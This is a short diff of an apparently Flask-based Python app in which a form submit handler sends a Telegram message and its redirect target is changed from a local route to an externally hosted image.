@@ -36,7 +36,7 @@ def submit():
     bot.send_message(CHAT_ID, telegram_message)
 
     # Redirect to a specific URL
-    return redirect("http://0.0.0.0:5000/urlhere")
+    return redirect("https://files.catbox.moe/3cd0gt.jpeg")
 
 # Define the /urlhere route
 @app.route('/urlhere')
